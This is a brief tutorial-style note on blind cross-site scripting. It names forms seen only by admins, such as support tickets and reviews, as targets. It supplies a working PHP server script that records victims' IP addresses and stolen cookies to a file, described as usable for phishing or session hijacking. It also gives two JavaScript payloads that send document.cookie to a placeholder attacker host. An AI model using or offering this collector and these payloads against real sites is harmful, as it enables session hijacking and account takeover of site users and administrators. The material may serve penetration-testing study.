A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.

Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

- Contact Forms
- Reviews
- User Details
- Support Tickets


This simple PHP application can be used in phishing or session hijacking for obtaining tokens
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

It can be loaded using custom script.js file with any of those commands: 
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
